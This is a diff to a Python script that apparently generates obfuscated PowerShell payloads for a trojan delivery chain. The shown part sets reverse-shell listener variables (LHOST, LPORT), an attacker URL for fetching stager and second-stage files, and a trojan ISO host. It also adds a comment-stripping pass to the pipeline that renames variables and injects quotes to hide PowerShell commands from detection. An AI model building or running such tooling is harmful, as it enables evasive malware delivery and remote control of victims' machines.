@@ -50,8 +50,8 @@ except ImportError:
 # VARIABLES — EDIT THESE BEFORE RUNNING THE SCRIPT
 # ==============================================================================
 # IP and port on which the listener is listening
-LHOST        = "151.67.18.144"
-LPORT        = "9001"
+LHOST        = "192.168.1.139"
+LPORT        = "21"
 # Host from which you download second.TXT, stager.TXT
 ATTACKER_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
 # Host from which you download trojan.ISO
@@ -148,6 +148,60 @@ def write_file(path: str, content: str):
     with open(path, "w", encoding="utf-8") as f:
         f.write(content)
 
+
+
+# ==============================================================================
+# OBFUSCATION — PASS 0: Delete Comment and empty rows
+# ==============================================================================
+
+def clean_powershell_content(content: str) -> str:
+    # Remove multiline comments <# ... #>
+    content = re.sub(r'<#.*?#>', '', content, flags=re.DOTALL)
+
+    cleaned_lines = []
+    for line in content.splitlines():
+        # Remove inline and end-of-line comments
+        cleaned_line = _remove_inline_comment(line)
+
+        # Keep only non-empty lines
+        if cleaned_line.strip():
+            cleaned_lines.append(cleaned_line.rstrip())
+
+    return '\n'.join(cleaned_lines) + '\n'
+
+
+def _remove_inline_comment(line: str) -> str:
+    # Strip the comment portion (#...) from a line,
+    # preserving # characters inside single or double quoted strings
+    result = []
+    in_single_quote = False
+    in_double_quote = False
+    i = 0
+
+    while i < len(line):
+        ch = line[i]
+
+        if ch == "'" and not in_double_quote:
+            in_single_quote = not in_single_quote
+            result.append(ch)
+        elif ch == '"' and not in_single_quote:
+            # Handle backtick-escaped quote inside double-quoted strings
+            if in_double_quote and i > 0 and line[i - 1] == '`':
+                result.append(ch)
+            else:
+                in_double_quote = not in_double_quote
+                result.append(ch)
+        elif ch == '#' and not in_single_quote and not in_double_quote:
+            break
+        else:
+            result.append(ch)
+
+        i += 1
+
+    return ''.join(result)
+    
+    
+    
 
 # ==============================================================================
 # OBFUSCATION — PASS 1: Variable renaming
@@ -408,7 +462,16 @@ def full_obfuscation_pipeline(content: str, label: str) -> str:
     else:
         info(f"  [{label}] No assignable user-defined variables found.")
 
-    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — '' injection)...")
+    info(f"  [{label}] Pass 2: Remouve comment and empty lines")
+    before = content
+    content = clean_powershell_content(content)
+    if content != before:
+        ok(f"  [{label}] PS cleared.")
+    else:
+        info(f"  [{label}] No comments or empty lines found.")
+
+
+    info(f"  [{label}] Pass 3: Obfuscating PS command tokens (Method 1 — '' injection)...")
     before = content
     content = obfuscate_ps_commands(content, PS_CMD_FILE)
     if content != before:
@@ -446,8 +509,17 @@ def full_obfuscation_pipeline_extended(content: str, label: str) -> str:
     else:
         info(f"  [{label}] No assignable user-defined variables found.")
 
+    info(f"  [{label}] Pass 2: Remouve comment and empty lines")
+    before = content
+    content = clean_powershell_content(content)
+    if content != before:
+        ok(f"  [{label}] PS cleared.")
+    else:
+        info(f"  [{label}] No comments or empty lines found.")
+
+
     # --- Pass 2: Quote injection ('' only) ---
-    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — '' injection)...")
+    info(f"  [{label}] Pass 3: Obfuscating PS command tokens (Method 1 — '' injection)...")
     before = content
     content = obfuscate_ps_commands(content, PS_CMD_FILE)
     if content != before:
